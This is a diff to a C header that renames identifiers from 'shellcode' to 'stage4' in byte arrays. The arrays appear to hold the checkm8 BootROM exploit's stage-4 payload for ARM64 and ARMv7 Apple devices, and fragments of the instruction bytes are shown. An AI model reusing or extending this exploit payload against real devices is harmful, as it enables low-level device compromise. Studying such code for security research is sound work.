@@ -1,7 +1,7 @@
-/* shellcode.h -- checkm8 stage-4 code (ARM64 + ARMv7) */
+/* stage4_code.h -- checkm8 stage-4 code (ARM64 + ARMv7) */
 
-#ifndef SHELLCODE_H
-#define SHELLCODE_H
+#ifndef STAGE4_CODE_H
+#define STAGE4_CODE_H
 
 #include <stddef.h>
 #include <stdint.h>
@@ -22,7 +22,7 @@
 #define CHECKM8_PWND_TAG  "PWND:[checkm8]"
 
 /* clang-format off */
-static const uint8_t checkm8_shellcode_arm64[] = {
+static const uint8_t checkm8_stage4_arm64[] = {
     /* PWND marker + DFU hook installer (ARM64) */
     0xFD, 0x7B, 0xBF, 0xA9,  /* stp  x29, x30, [sp, #-0x10]! */
     0x20, 0x04, 0x00, 0x58,  /* ldr  x0, [pc, #0x84]          */
@@ -56,8 +56,8 @@ static const uint8_t checkm8_shellcode_arm64[] = {
     0xC0, 0x03, 0x5F, 0xD6,  /* ret                           */
 };
 
-static const size_t checkm8_shellcode_arm64_len =
-    sizeof(checkm8_shellcode_arm64);
+static const size_t checkm8_stage4_arm64_len =
+    sizeof(checkm8_stage4_arm64);
 
 /*
  * ARMv7 payload code.
@@ -65,7 +65,7 @@ static const size_t checkm8_shellcode_arm64_len =
  * Same responsibilities as ARM64 variant, but for 32-bit BootROMs
  * (Apple Watch S1P/S3, Apple TV 3rd gen).
  */
-static const uint8_t checkm8_shellcode_armv7[] = {
+static const uint8_t checkm8_stage4_armv7[] = {
     0x04, 0xE0, 0x2D, 0xE5,  /* str  lr, [sp, #-4]!           */
     0x8C, 0x00, 0x9F, 0xE5,  /* ldr  r0, [pc, #0x8C]          */
     0x8C, 0x30, 0x9F, 0xE5,  /* ldr  r3, [pc, #0x8C]          */
@@ -102,9 +102,9 @@ static const uint8_t checkm8_shellcode_armv7[] = {
     0x04, 0xF0, 0x9D, 0xE4,  /* ldr  pc, [sp], #4             */
 };
 
-static const size_t checkm8_shellcode_armv7_len =
-    sizeof(checkm8_shellcode_armv7);
+static const size_t checkm8_stage4_armv7_len =
+    sizeof(checkm8_stage4_armv7);
 
 /* clang-format on */
 
-#endif /* SHELLCODE_H */
+#endif /* STAGE4_CODE_H */
